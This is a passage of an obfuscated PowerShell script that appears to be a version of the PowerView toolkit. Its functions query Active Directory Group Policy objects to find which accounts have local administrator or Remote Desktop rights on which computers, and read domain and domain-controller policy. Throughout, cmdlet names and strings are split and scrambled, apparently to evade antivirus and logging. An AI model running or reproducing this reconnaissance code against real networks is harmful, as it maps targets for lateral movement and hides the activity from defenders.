        ${GP`OnA`mE} = '*',

        [String]
        ${DIsP`l`AynAMe},

        [Switch]
        ${r`eS`OlvEsI`Ds},

        [String]
        ${DOm`AIn},

        [String]
        ${dOmaI`NC`o`NT`RoLler},

        [String]
        ${Adspa`Th},

        [Switch]
        ${u`S`ePsDrIVE},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`AGES`ize} = 200
    )

    
    &("{2}{0}{1}" -f 'e','t-NetGPO','G') -GPOName ${gPo`N`AMe} -DisplayName ${G`pON`AmE} -Domain ${doMa`iN} -DomainController ${doMA`I`NcO`NTRo`lLER} -ADSpath ${Ad`Sp`ATh} -PageSize ${p`AGeSI`zE} | &("{0}{1}{2}{3}"-f 'Fo','reac','h-','Object') {

        ${M`emB`E`ROF} = ${N`Ull}
        ${m`eMBerS} = ${n`ULL}
        ${Gpo`D`iSpLay`NA`mE} = ${_}."diS`PLay`NA`Me"
        ${G`pO`NaMe} = ${_}."NA`ME"
        ${gp`o`pATh} = ${_}."gpc`F`ileS`YSpa`Th"

        ${p`A`RsearGS} =  @{
            ("{3}{0}{1}{2}" -f 'tTmpl','Pa','th','Gp') = ("$GPOPath\MACHINE\Microsoft\Windows "+(('NTYh4'+'Se'+'cEdit'+'Yh4'+'GptTmpl.inf')-REPlacE ([ChAr]89+[ChAr]104+[ChAr]52),[ChAr]92))
            ("{1}{2}{0}"-f'SDrive','U','seP') = ${U`s`Eps`dRivE}
        }

        
        ${I`Nf} = &("{0}{2}{1}" -f 'Get-Gp','pl','tTm') @ParseArgs

        if(${i`NF}."gROup`meMb`E`Rsh`Ip") {

            ${M`EmBeR`OF} = ${I`Nf}."Gro`UP`MEMbe`RShiP" | &("{0}{2}{1}{3}" -f 'Ge','e','t-Memb','r') ("{1}{0}{3}{2}" -f'Membe','*','f','ro') | &("{0}{3}{2}{1}" -f'F','ct','Each-Obje','or') { ${I`Nf}."g`RoU`pmemb`er`shiP".(${_}."N`AME") } | &("{2}{3}{0}{1}" -f 'ach-Obje','ct','Fo','rE') { ${_}.("{1}{0}" -f 'im','tr').Invoke('*') }
            ${m`e`mbErS} = ${I`Nf}."G`ROu`pMEM`B`ersHip" | &("{1}{2}{0}"-f'er','G','et-Memb') ("{1}{2}{0}" -f's','*Memb','er') | &("{1}{2}{0}{3}"-f'Obje','ForEac','h-','ct') { ${i`Nf}."GRO`Up`MeMBE`RsHip".(${_}."N`AmE") } | &("{1}{0}{3}{2}"-f'orE','F','ject','ach-Ob') { ${_}.("{0}{1}" -f't','rim').Invoke('*') }

            
            if (${M`eMBE`RS} -or ${M`embEr`oF}) {

                
                if(!${mEMb`E`ROf}) {
                    ${memB`E`RoF} = ("{2}{0}{1}" -f'2','-544','S-1-5-3')
                }

                if(${rEs`o`L`VEsiDs}) {
                    ${mem`B`erof} = ${m`e`mbE`RoF} | &("{0}{4}{1}{2}{3}"-f 'F','ac','h-Obje','ct','orE') {&("{3}{1}{0}{2}"-f'dToN','rt-Si','ame','Conve') ${_}}
                    ${mEm`Be`RS} = ${M`eM`BErS} | &("{1}{3}{2}{0}" -f 'ct','F','je','orEach-Ob') {&("{3}{0}{2}{1}" -f'ert-Sid','me','ToNa','Conv') ${_}}
                }

                if(${member`of} -isnot [system.array]) {${m`e`MbERoF} = @(${M`EMBe`ROF})}
                if(${Me`mb`ERS} -isnot [system.array]) {${mEMb`E`Rs} = @(${m`EmBE`Rs})}

                ${gPoPrOP`ERti`Es} = @{
                    ("{0}{1}{3}{2}"-f'GPO','Dis','ayName','pl') = ${Gp`Odi`s`P`laynAmE}
                    ("{0}{1}"-f'GPO','Name') = ${gp`O`Name}
                    ("{1}{2}{0}" -f 'h','GPOP','at') = ${g`PoPA`TH}
                    ("{1}{0}"-f'ers','Filt') = ${n`ULl}
                    ("{1}{0}{2}" -f 'O','Member','f') = ${MeMBer`of}
                    ("{0}{2}{1}" -f'M','rs','embe') = ${ME`mbErS}
                }

                &("{2}{0}{1}" -f 'w-Ob','ject','Ne') -TypeName ("{1}{0}"-f't','PSObjec') -Property ${g`pOpROp`ERt`iES}
            }
        }

        ${PA`R`SeArgS} =  @{
            ("{1}{2}{0}" -f'path','GroupsXM','L') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            ("{2}{0}{1}"-f'ol','veSids','Res') = ${r`ESOlv`es`IDS}
            ("{1}{0}{2}"-f'SDr','UseP','ive') = ${UsE`pS`DRiVE}
        }

        &("{2}{0}{1}{4}{3}" -f '-G','r','Get','upsXML','o') @ParseArgs
    }
}


function f`i`ND-`gPolOC`ATI`on {


    [CmdletBinding()]
    Param (
        [String]
        ${uS`e`RNAMe},

        [String]
        ${Gr`O`UpName},

        [String]
        ${DOMA`iN},

        [String]
        ${doMAI`NCOnTrO`Ll`Er},

        [String]
        ${lOcalGr`O`Up} = ("{2}{0}{1}{3}" -f 'in','istrat','Adm','ors'),
        
        [Switch]
        ${u`S`ePsDRIVE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAGES`I`ZE} = 200
    )

    if(${USE`RnA`mE}) {

        ${U`seR} = &("{1}{2}{0}"-f'r','Get-NetU','se') -UserName ${US`Er`N`AmE} -Domain ${dO`M`Ain} -DomainController ${DO`MainC`ONTr`O`lLER} -PageSize ${pAg`EsI`Ze}
        ${usEr`siD} = ${us`eR}."o`B`JEctSID"

        if(!${uSerS`ID}) {    
            Throw ('User'+' '+"'$UserName' "+'n'+'ot '+'fo'+'und!')
        }

        ${TArg`E`TsID} = ${u`SerSID}
        ${Obj`Ec`T`samAcCoUntnamE} = ${u`seR}."s`A`Mac`cO`UNtnAMe"
        ${OBJ`ECtd`iSTn`A`ME} = ${u`Ser}."diST`iNgU`iSHE`dNAMe"
    }
    elseif(${gR`ou`p`NAme}) {

        ${g`Ro`UP} = &("{0}{3}{1}{2}" -f 'G','Grou','p','et-Net') -GroupName ${Gr`o`UpNAme} -Domain ${do`mA`IN} -DomainController ${DoMAI`N`CONTR`olLeR} -FullData -PageSize ${p`A`gESIzE}
        ${GRO`UPS`ID} = ${grO`UP}."obJE`Ct`SiD"

        if(!${g`Ro`UPsID}) {    
            Throw ('G'+'roup '+"'$GroupName' "+'no'+'t '+'f'+'ou'+'nd!')
        }

        ${tArget`S`iD} = ${gRO`Up`Sid}
        ${objeCtS`A`MaCCO`UNTN`Ame} = ${g`ROUp}."sAMaCCO`U`Ntn`A`me"
        ${obJ`eCtD`iStna`me} = ${g`RO`Up}."DIsTiNgU`i`shEdNa`me"
    }
    else {
        throw ("{3}{4}{2}{0}{5}{6}{1}" -f'oup',' specified!','r -Gr','-User','Name o','Name must ','be')
    }

    if(${LO`ca`L`gRoup} -like ("{2}{0}{1}"-f'Ad','min*','*')) {
        ${LOcaL`S`iD} = ("{0}{1}{2}" -f'S','-1-5-32-54','4')
    }
    elseif ( (${LOCal`GR`oUP} -like ("{1}{0}"-f'*','*RDP')) -or (${L`OCALgrO`Up} -like ("{2}{1}{0}" -f'te*','emo','*R')) ) {
        ${lo`caL`SId} = ("{2}{1}{0}"-f'-32-555','-5','S-1')
    }
    elseif (${lO`CALG`RoUP} -like ("{0}{1}"-f'S-1','-5*')) {
        ${L`ocA`lSId} = ${LOCAL`Gr`oUP}
    }
    else {
        throw ((("{16}{5}{6}{20}{8}{17}{2}{12}{11}{4}{14}{1}{3}{18}{21}{13}{15}{10}{0}{19}{7}{9}" -f 't','a ','s','{','{0}RD','calGr','oup m','e s','inis','id.',' ',', ','{0}','0','P{0}, or ','}','Lo','trator','0','yp','ust be {0}Adm','}S-1-5-X{'))-F  [cHaR]39)
    }

    &("{1}{2}{3}{4}{0}"-f 'e','Wr','ite-','Verb','os') ('Loca'+'lSid:'+' '+"$LocalSID")
    &("{0}{1}{2}" -f 'W','rite-Ve','rbose') ('Tar'+'getS'+'i'+'d: '+"$TargetSid")
    &("{0}{3}{2}{4}{1}"-f 'W','ose','-V','rite','erb') ('T'+'a'+'rgetObjectDi'+'stNam'+'e: '+"$ObjectDistName")

    if(${t`A`RGetS`id} -isnot [system.array]) { ${tAR`gETS`iD} = @(${TAR`GE`Ts`iD}) }

    
    
    ${TAr`g`E`TsId} += &("{2}{0}{1}" -f 't-N','etGroup','Ge') -Domain ${Do`mA`In} -DomainController ${D`o`mAIN`co`N`TRoLlER} -PageSize ${PA`gESi`zE} -UserName ${ob`je`C`TSA`MaCCOuNTNaMe} -RawSids

    if(${tAR`g`eTSid} -isnot [system.array]) { ${T`ArGET`siD} = @(${tArg`eTs`Id}) }

    &("{1}{2}{3}{0}"-f'rbose','Wr','ite-','Ve') ('Eff'+'e'+'ctive '+'ta'+'rget '+'s'+'ids'+': '+"$TargetSid")

    ${gpogROUp`A`R`GS} =  @{
        ("{0}{1}"-f 'Doma','in') = ${dO`MA`in}
        ("{0}{3}{2}{1}{4}"-f'Dom','rolle','nt','ainCo','r') = ${d`oMa`InCon`T`RoLlEr}
        ("{2}{0}{1}"-f'eP','SDrive','Us') = ${USE`pSd`RIve}
        ("{0}{1}"-f 'PageSiz','e') = ${pAG`e`s`izE}
    }

    
    
    ${GP`OGroU`ps} = &("{3}{2}{1}{0}"-f'GPOGroup','t','et-Ne','G') @GPOGroupArgs | &("{1}{0}{2}{3}"-f 'rEac','Fo','h','-Object') {
        
        if (${_}."mE`m`BerS") {
            ${_}."MEMB`e`Rs" = ${_}."Mem`Be`RS" | &("{0}{2}{1}{3}" -f'Whe','jec','re-Ob','t') {${_}} | &("{0}{1}{2}"-f 'Fo','rEach-Obje','ct') {
                if(${_} -match ("{0}{1}"-f'S-','1-5')) {
                    ${_}
                }
                else {
                    
                    &("{1}{3}{0}{2}{4}" -f 'rt-Na','Con','meToSi','ve','d') -ObjectName ${_} -Domain ${dOma`in}
                }
            }

            
            if(${_}."MeMB`e`Rs" -isnot [system.array]) { ${_}."ME`M`BeRs" = @(${_}."M`EMBe`Rs") }
            if(${_}."mEm`BER`oF" -isnot [system.array]) { ${_}."mEM`BER`oF" = @(${_}."M`EmB`eroF") }
            
            if(${_}."m`eMb`Ers") {
                try {
                    

                    
                    if( (&("{3}{2}{0}{4}{1}" -f'e-Ob','ect','ompar','C','j') -ReferenceObject ${_}."MEm`BERS" -DifferenceObject ${T`A`RgE`TSid} -IncludeEqual -ExcludeDifferent) ) {
                        if (${_}."mEMBE`R`Of" -contains ${l`oCal`SID}) {
                            ${_}
                        }
                    }
                } 
                catch {
                    &("{0}{1}{2}" -f'Write-','Deb','ug') ('Err'+'or '+'com'+'parin'+'g '+'m'+'embers'+' '+'an'+'d '+"$TargetSid "+': '+"$_")
                }
            }
        }
    }

    &("{2}{1}{0}" -f'bose','r','Write-Ve') ('GP'+'O'+'groups: '+"$GPOgroups")
    ${pr`oC`E`SsE`dgUIDS} = @{}

    
    ${GP`Og`ROUpS} | &("{3}{0}{2}{1}"-f 'Ob','t','jec','Where-') {${_}} | &("{4}{2}{0}{3}{1}" -f'ch-','t','Ea','Objec','For') {

        ${G`POGU`ID} = ${_}."GpoN`AmE"

        if( -not ${prOCesse`d`Gu`I`dS}[${GP`oGuiD}] ) {
            ${GPo`NaME} = ${_}."G`PODiSplAy`NaMe"
            ${f`Il`TErS} = ${_}."Fil`Ters"

            
            &("{1}{0}{2}"-f't-','Ge','NetOU') -Domain ${D`om`AIN} -DomainController ${do`M`AINc`ont`ROL`LER} -GUID ${GP`ogUId} -FullData -PageSize ${pA`gES`IZe} | &("{2}{1}{3}{0}" -f'ect','ach-','ForE','Obj') {

                if(${fIlT`erS}) {
                    
                    
                    ${OuCOM`p`UtE`RS} = &("{3}{0}{2}{1}" -f't-N','tComputer','e','Ge') -ADSpath ${_}."aDS`PATH" -FullData -PageSize ${pAGE`Si`zE} | &("{2}{0}{1}"-f 'b','ject','Where-O') {
                        ${_}."aDSp`AtH" -match (${Fi`LTe`RS}."v`AluE")
                    } | &("{1}{0}{2}{3}"-f'-Ob','ForEach','j','ect') { ${_}."dnsh`ostNa`me" }
                }
                else {
                    ${oUCoM`PU`Te`Rs} = &("{3}{2}{1}{0}{4}" -f 'mpute','Co','t','Get-Ne','r') -ADSpath ${_}."a`dsP`ATH" -PageSize ${p`AgE`Size}
                }

                ${gP`oloC`AtI`on} = &("{2}{0}{1}" -f'ec','t','New-Obj') ("{1}{2}{0}" -f 't','PSObje','c')
                ${G`POl`oCAtiOn} | &("{3}{0}{2}{1}" -f 'dd-Mem','er','b','A') ("{2}{1}{0}" -f 'y','epropert','Not') ("{1}{0}{3}{2}"-f 'ect','Obj','e','Nam') ${ObJEC`T`Di`StnA`me}
                ${g`poloCAt`I`on} | &("{2}{3}{0}{1}"-f 'm','ber','Add-','Me') ("{2}{1}{0}" -f'y','ert','Noteprop') ("{0}{2}{1}" -f'GP','me','Ona') ${G`PONa`me}
                ${Gpol`ocATI`oN} | &("{2}{1}{0}{3}"-f 'Membe','d-','Ad','r') ("{2}{1}{0}{3}" -f 'pert','ro','Notep','y') ("{0}{1}"-f 'G','POguid') ${gP`ogu`ID}
                ${G`PoLO`CA`TioN} | &("{2}{0}{1}" -f'-Me','mber','Add') ("{0}{2}{1}" -f'No','perty','tepro') ("{0}{2}{1}" -f 'Contain','rName','e') ${_}."dISTinGUish`e`d`NAMe"
                ${gpO`lo`CAt`ion} | &("{1}{3}{0}{2}"-f 'mb','Add-M','er','e') ("{0}{1}{2}" -f'No','tepr','operty') ("{1}{2}{0}" -f 'ters','Co','mpu') ${O`Uc`ompu`TERS}
                ${GpOLoca`T`Ion}
            }

            
            
            
            
            
            
            
            
            
            
            
            
            

            
            
            
            
            
            
            
            
            

            
            ${PrOCE`s`SE`dG`UIds}[${G`PO`guId}] = ${TR`Ue}
        }
    }

}


function fiN`d-GpO`compUt`E`RADMiN {


    [CmdletBinding()]
    Param (
        [Parameter(valUEfrOmPipeLINE=${t`RuE})]
        [String]
        ${c`OmpuT`E`RNa`ME},

        [String]
        ${O`U`NamE},

        [String]
        ${d`o`MaIn},

        [String]
        ${d`oM`AINConTR`o`L`LEr},

        [Switch]
        ${RE`c`UrsE},

        [String]
        ${LO`CaLG`ROuP} = ("{3}{0}{1}{2}"-f'istrat','o','rs','Admin'),

        [Switch]
        ${uS`ePsdR`i`Ve},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`ges`IzE} = 200
    )

    process {
    
        if(!${cOm`put`eR`NamE} -and !${o`Un`Ame}) {
            Throw ("{1}{4}{5}{2}{0}{8}{10}{3}{6}{7}{9}"-f 'r -','-Co','e o','t','mpu','terNam',' be ','provi','OUName','ded',' mus')
        }

        if(${CO`mPU`TernAmE}) {
            ${C`OM`pute`RS} = &("{3}{1}{2}{0}" -f'puter','t-Net','Com','Ge') -ComputerName ${Co`mp`UT`ERNAME} -Domain ${dOM`A`in} -DomainController ${D`OM`Ai`NcoNTroLlER} -FullData -PageSize ${pages`I`ze}

            if(!${Co`m`Put`eRS}) {
                throw ('Com'+'pute'+'r'+' '+"$Computer "+'in'+' '+'doma'+'in'+' '+"'$Domain' "+'not'+' '+'fou'+'nd!')
            }
            
            ForEach(${CoM`PU`TeR} in ${coM`pU`T`ers}) {
                
                ${d`N} = ${co`mPUter}."Di`sti`NGuI`shEDNAmE"

                ${TAR`g`eto`US} = ${d`N}.("{1}{0}"-f'plit','s').Invoke(",") | &("{2}{0}{1}{3}"-f 'oreach','-Obj','F','ect') {
                    if(${_}.("{1}{2}{0}" -f 'ith','st','artsw').Invoke("OU=")) {
                        ${Dn}.("{1}{2}{0}"-f'ing','sub','str').Invoke(${d`N}.("{0}{2}{1}"-f'inde','of','x').Invoke(${_}))
                    }
                }
            }
        }
        else {
            ${TA`RGE`T`OUS} = @(${OUn`AmE})
        }

        &("{1}{0}{2}{3}"-f 'te-V','Wri','erbo','se') ('Ta'+'rg'+'et '+'OU'+'s: '+"$TargetOUs")

        ${TARg`e`Tous} | &("{0}{2}{1}{3}" -f 'W','Obje','here-','ct') {${_}} | &("{3}{4}{2}{1}{0}" -f 'ect','bj','ch-O','Fo','rea') {

            ${OU} = ${_}

            
            ${G`pOgrou`PS} = &("{2}{0}{1}"-f 'et-Net','OU','G') -Domain ${D`oma`IN} -DomainController ${DOmaI`Nc`ONtRO`l`LeR} -ADSpath ${_} -FullData -PageSize ${PA`ge`sIZE} | &("{1}{3}{2}{0}" -f 't','For','bjec','each-O') { 
                
                ${_}."gPli`Nk"."Spl`it"("][") | &("{3}{1}{0}{2}"-f 'h-','eac','Object','For') {
                    if (${_}.("{1}{3}{2}{0}"-f'h','st','wit','arts').Invoke(("{0}{1}"-f 'LD','AP'))) {
                        ${_}.("{1}{0}" -f'it','spl').Invoke(";")[0]
                    }
                }
            } | &("{1}{0}{3}{2}" -f'oreach','F','ct','-Obje') {
                ${GPo`gRoUPa`R`gS} =  @{
                    ("{0}{1}" -f'D','omain') = ${d`OM`Ain}
                    ("{3}{0}{2}{1}" -f 'ainC','ntroller','o','Dom') = ${DoMa`iN`cOnT`RolLeR}
                    ("{2}{0}{1}"-f 'Spa','th','AD') = ${_}
                    ("{0}{2}{1}"-f 'U','SDrive','seP') = ${Us`Ep`SdRI`VE}
                    ("{2}{0}{1}"-f'g','eSize','Pa') = ${PaGes`I`zE}
                }

                
                &("{1}{2}{3}{0}"-f 'up','Ge','t-N','etGPOGro') @GPOGroupArgs
            }

            
            ${gPo`g`RoUPS} | &("{2}{0}{1}"-f'ere-Objec','t','Wh') {${_}} | &("{0}{3}{1}{2}"-f 'Fore','bj','ect','ach-O') {
                ${G`PO} = ${_}
                ${G`pO}."mEmB`Ers" | &("{0}{3}{2}{1}" -f'For','ct','h-Obje','eac') {

                    
                    ${obj`e`CT} = &("{0}{2}{3}{1}"-f'Get-','bject','AD','O') -Domain ${DOm`AIn} -DomainController ${doMa`InC`OntROl`lER} ${_} -PageSize ${Pa`gE`SIzE}

                    ${GpocOMpU`T`ErA`D`miN} = &("{1}{2}{0}" -f'ect','New','-Obj') ("{1}{2}{0}" -f't','P','SObjec')
                    ${gpocoMP`Ut`Er`Ad`M`in} | &("{2}{3}{0}{1}"-f 'Me','mber','Add','-') ("{2}{1}{0}"-f 'y','otepropert','N') ("{2}{0}{1}" -f'erNa','me','Comput') ${COm`P`UTeR`NAme}
                    ${G`POcoM`pU`TE`RaD`Min} | &("{1}{2}{0}{3}" -f'em','Add','-M','ber') ("{2}{1}{0}" -f 'operty','epr','Not') 'OU' ${o`U}
                    ${GPOc`om`Pu`TERa`DMIn} | &("{2}{0}{1}" -f 'd','d-Member','A') ("{3}{0}{2}{1}"-f 'tepr','rty','ope','No') ("{4}{1}{0}{2}{3}" -f 'spla','ODi','yNa','me','GP') ${G`pO}."g`pO`dI`splaY`NAmE"
                    ${GP`oCO`MPU`TERADmin} | &("{1}{2}{0}" -f'd-Member','A','d') ("{1}{2}{0}"-f 'ty','Not','eproper') ("{1}{0}{2}" -f 'OP','GP','ath') ${G`PO}."Gp`OpAth"
                    ${gPoco`Mp`U`T`eRaDmIN} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{3}{1}{2}{0}" -f'rty','te','prope','No') ("{0}{2}{1}" -f'Obj','ctName','e') ${O`BjECT}."Na`Me"
                    ${gPoc`O`MpUTE`RADmIn} | &("{3}{0}{2}{1}" -f 'd-Me','ber','m','Ad') ("{0}{2}{3}{1}"-f 'No','ty','tepro','per') ("{2}{0}{1}" -f'e','ctDN','Obj') ${obj`ECt}."dIStiNGuiS`H`Ed`NAme"
                    ${Gpoc`OMp`UTEr`Ad`m`iN} | &("{3}{2}{1}{0}"-f'r','Membe','-','Add') ("{1}{0}{2}" -f 'r','Noteprope','ty') ("{0}{2}{1}" -f'Obje','SID','ct') ${_}
                    ${gp`OcOMp`U`T`eRa`DMIn} | &("{1}{2}{0}{3}"-f'Memb','A','dd-','er') ("{1}{0}{2}"-f'rope','Notep','rty') ("{0}{1}"-f'IsG','roup') $(${oBj`E`ct}."S`A`maCcoUN`TType" -notmatch ("{0}{1}" -f '8053','06368'))
                    ${GpO`CompUT`e`RAdM`iN} 

                    
                    if(${R`ecUR`sE} -and ${gPo`coM`pUtEra`Dmin}."I`SGrOuP") {

                        &("{1}{0}{4}{3}{2}" -f'rou','Get-NetG','mber','Me','p') -SID ${_} -FullData -Recurse -PageSize ${pagE`SI`zE} | &("{2}{3}{0}{1}" -f'ch-Obje','ct','Fo','rea') {

                            ${m`eMBe`RDn} = ${_}."diSti`NGui`sHe`DnAMe"

                            
                            ${ME`mB`ErdO`MAIN} = ${mE`MBerdN}.("{2}{1}{0}"-f 'ing','bStr','su').Invoke(${mEmB`e`RDN}.("{0}{1}{2}" -f 'In','dex','Of').Invoke("DC=")) -replace 'DC=','' -replace ',','.'

                            if (${_}."sAmAccO`Un`TTyPE" -ne ("{0}{1}" -f'805','306368')) {
                                ${m`emb`eR`Is`GrouP} = ${T`Rue}
                            }
                            else {
                                ${mE`MBE`Ri`SGrOUp} = ${fa`lsE}
                            }

                            if (${_}."sAMaCco`UnT`Name") {
                                
                                ${M`EM`BerN`AMe} = ${_}."s`Am`Ac`cOu`NTNaME"
                            }
                            else {
                                
                                try {
                                    ${MeM`BeRNA`mE} = &("{1}{2}{4}{3}{0}" -f 'Name','Co','n','idTo','vert-S') ${_}."CN"
                                }
                                catch {
                                    
                                    ${meMber`N`A`mE} = ${_}."Cn"
                                }
                            }

                            ${g`pOC`o`mpUteRaDm`IN} = &("{1}{2}{0}" -f'ct','New-O','bje') ("{0}{1}" -f'PSObjec','t')
                            ${gPO`Com`Pu`T`eradM`In} | &("{0}{2}{1}"-f 'Add-M','er','emb') ("{0}{1}{2}"-f'Not','eproper','ty') ("{2}{3}{1}{0}"-f 'ame','N','C','omputer') ${co`MPute`R`Name}
                            ${g`p`O`CoMp`UTEr`AdmIN} | &("{2}{1}{0}"-f'er','d-Memb','Ad') ("{1}{0}{3}{2}" -f 'e','Not','perty','pro') 'OU' ${ou}
                            ${GPO`COMpUteR`Ad`m`iN} | &("{2}{3}{0}{1}"-f'd-Memb','er','A','d') ("{3}{1}{2}{0}" -f'rty','otepro','pe','N') ("{4}{1}{2}{0}{3}" -f'Nam','OD','isplay','e','GP') ${g`po}."gPO`DIS`PLAYN`AmE"
                            ${GPo`c`omPUTErADm`iN} | &("{0}{1}{2}{3}"-f'A','dd-Me','m','ber') ("{3}{0}{1}{2}"-f 'epro','pert','y','Not') ("{2}{1}{0}" -f 'h','t','GPOPa') ${G`po}."gpo`pAtH"
                            ${Gp`OCO`mPuTeRADM`in} | &("{0}{1}{2}" -f 'A','dd-Mem','ber') ("{1}{0}{2}" -f 'propert','Note','y') ("{2}{1}{0}"-f 'tName','jec','Ob') ${me`M`BErna`ME}
                            ${G`p`O`CompUTERAD`MIN} | &("{2}{1}{0}"-f'd-Member','d','A') ("{1}{3}{2}{0}" -f 'rty','Not','pe','epro') ("{2}{1}{0}" -f'DN','ject','Ob') ${MEm`BE`RdN}
                            ${GPo`cOM`pUT`e`RADMIn} | &("{1}{2}{0}"-f 'ember','Add-','M') ("{2}{1}{0}" -f 'ty','roper','Notep') ("{1}{2}{0}" -f 'ID','Object','S') ${_}."o`BJ`EcTSid"
                            ${gpocOMP`U`TEr`ADM`IN} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{0}{3}{1}{2}" -f 'No','r','ty','teprope') ("{0}{2}{1}" -f 'Is','p','Grou') ${mem`B`E`Ri`SGrOup}
                            ${G`pOCo`M`PuTERAdmin} 
                        }
                    }
                }
            }
        }
    }
}


function gEt`-dOmaINp`Ol`i`CY {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet({"{1}{0}"-f 'main','Do'},"DC")]
        ${SOU`RCe} =("{1}{0}" -f 'main','Do'),

        [String]
        ${do`MAin},

        [String]
        ${DomaiNC`ont`ROl`L`eR},

        [Switch]
        ${ReSO`lVESi`Ds},

        [Switch]
        ${uSE`psDR`iVe}
    )

    if(${S`Ou`RCe} -eq ("{1}{0}" -f'omain','D')) {
        
        ${G`Po} = &("{1}{0}{2}"-f 'NetG','Get-','PO') -Domain ${D`oMain} -DomainController ${D`oMai`NcON`TroLL`Er} -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if(${G`Po}) {
            
            ${G`pTTm`plpa`TH} = ${g`pO}."G`Pcf`ILES`y`spATh" + ((("{3}{5}{6}{0}{9}{7}{8}{4}{10}{11}{2}{1}"-f 'fXFWi','nf','ptTmpl.i','fX','i','FMACH','INEfXFMicrosoft','o','ws NTfXFSecEd','nd','tf','XFG')).("{0}{1}" -f 'rep','lACe').Invoke('fXF','\'))

            ${p`Ar`Se`ARGs} =  @{
                ("{1}{2}{0}" -f'ath','GptTmp','lP') = ${gpTtm`PLP`A`TH}
                ("{1}{0}{2}" -f 'PSDr','Use','ive') = ${use`pSD`RivE}
            }

            
            &("{1}{2}{0}" -f'pl','G','et-GptTm') @ParseArgs
        }

    }
    elseif(${sO`U`Rce} -eq "DC") {
        
        ${G`Po} = &("{1}{0}{2}{3}" -f 'et-Ne','G','t','GPO') -Domain ${d`O`MAIN} -DomainController ${d`oMAI`NcontroL`LeR} -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if(${G`Po}) {
            
            ${gpT`Tmp`L`Path} = ${G`PO}."gPCfI`le`sYSPAth" + ((("{9}{2}{11}{1}{5}{6}{7}{10}{3}{8}{4}{0}"-f 'OGptTmpl.inf','OM','yO','dows','Edit0y','icro','soft0yO','W',' NT0yOSec','0','in','MACHINE0y'))."r`eplAcE"('0yO',[StRiNG][chAr]92))

            ${pars`e`AR`gS} =  @{
                ("{0}{3}{1}{2}"-f'Gp','lPa','th','tTmp') = ${gPttM`p`l`PAth}
                ("{0}{1}{2}" -f'UsePSD','r','ive') = ${us`EpSd`Rive}
            }

            
            &("{0}{2}{3}{1}"-f 'Get','tTmpl','-G','p') @ParseArgs | &("{0}{3}{2}{1}"-f'F','bject','h-O','oreac') {
                if(${rEsOl`V`es`ids}) {
                    
                    ${P`Ol`icY} = &("{3}{0}{2}{1}"-f 'b','t','jec','New-O') ("{2}{0}{1}"-f 'SObje','ct','P')
                    ${_}."PSo`BJECT"."PRop`ErTI`ES" | &("{0}{1}{2}{3}"-f'F','oreach-Ob','j','ect') {
                        if( ${_}."n`Ame" -eq ("{4}{0}{3}{1}{2}"-f'e','Righ','ts','ge','Privil')) {

                            ${PRiviL`eGeR`IgH`Ts} = &("{1}{2}{0}" -f 'ct','New-','Obje') ("{0}{1}"-f 'PS','Object')
                            
                            
                            ${_}."va`LuE"."Pso`Bje`cT"."p`R`OPErti`ES" | &("{0}{3}{1}{2}" -f 'Foreac','bjec','t','h-O') {

                                ${SI`DS} = ${_}."vAl`UE" | &("{3}{2}{0}{1}"-f'ch-Obje','ct','a','Fore') {
                                    try {
                                        if(${_} -isnot [System.Array]) { 
                                            &("{2}{3}{4}{1}{0}" -f'me','SidToNa','C','onvert','-') ${_} 
                                        }
                                        else {
                                            ${_} | &("{2}{3}{0}{1}"-f'ach-Objec','t','For','e') { &("{2}{1}{3}{4}{0}" -f'Name','onvert-Si','C','d','To') ${_} }
                                        }
                                    }
                                    catch {
                                        &("{0}{1}{2}" -f'Write-','Deb','ug') ('Error'+' '+'reso'+'l'+'ving '+'SI'+'D '+': '+"$_")
                                    }
                                }

                                ${PR`iVileG`ErIGH`Ts} | &("{2}{1}{0}" -f'r','embe','Add-M') ("{1}{3}{2}{0}"-f 'y','N','rt','oteprope') ${_}."Na`me" ${sI`DS}
                            }

                            ${pO`liCY} | &("{3}{2}{0}{1}" -f 'm','ber','-Me','Add') ("{0}{2}{1}"-f'Noteprope','y','rt') ("{1}{2}{0}{3}"-f 'lege','Pr','ivi','Rights') ${PriV`Il`e`g`ErIgHTS}
                        }
                        else {
                            ${P`OL`ICY} | &("{2}{1}{0}"-f 'r','e','Add-Memb') ("{1}{2}{0}"-f 'y','Notep','ropert') ${_}."N`AmE" ${_}."VAL`Ue"
                        }
                    }
                    ${pol`IcY}
                }
                else { ${_} }
            }
        }
    }
}











function GET`-`NeTloCaLg`R`O`Up {


    [CmdletBinding()]
    param(
        [Parameter(vAluEFroMpIPElInE=${T`RUE})]
        [Alias({"{1}{0}"-f 'ostName','H'})]
        [String]
        ${Co`M`PuT`eRNaMe} = ("{1}{0}{2}" -f 'ocalho','l','st'),

        [ValidateScript({&("{0}{2}{1}" -f 'Te','th','st-Pa') -Path ${_} })]
        [Alias({"{0}{1}"-f 'Ho','stList'})]
        [String]
        ${C`OMPutEr`File},

        [String]
        ${GrouP`N`AME} = ("{2}{0}{3}{1}"-f'min','tors','Ad','istra'),

        [Switch]
        ${LIS`TGRO`U`ps},

        [Switch]
        ${rEcU`R`SE}
    )

    begin {
        if ((-not ${liS`TgRo`U`PS}) -and (-not ${GroUp`NA`mE})) {
            
            ${O`BJs`ID} = &("{2}{1}{0}"-f'ct','bje','New-O') ("{6}{5}{3}{4}{0}{7}{1}{2}"-f 'Se','rityIdent','ifier','inci','pal.','Security.Pr','System.','cu')(("{0}{3}{2}{1}"-f 'S','4','-54','-1-5-32'))
            ${Obj`GRO`Up} = ${O`BJsID}."T`RaN`slatE"( [System.Security.Principal.NTAccount])
            ${G`R`Oupna`mE} = (${O`B`JgrO`Up}."VAL`Ue").("{1}{0}"-f 'plit','S').Invoke('\')[1]
        }
    }
    process {

        ${sErv`e`Rs} = @()

        
        if(${c`OMP`UtE`RFiLe}) {
            ${SErv`ErS} = &("{0}{3}{1}{2}" -f'Get','nte','nt','-Co') -Path ${cOmpuT`er`FI`LE}
        }
        else {
            
            ${se`R`VERS} += &("{2}{1}{0}" -f'meField','-Na','Get') -Object ${cO`MPU`TeRnaME}
        }

        
        
        ForEach(${se`R`VeR} in ${SeRVE`RS}) {
            try {
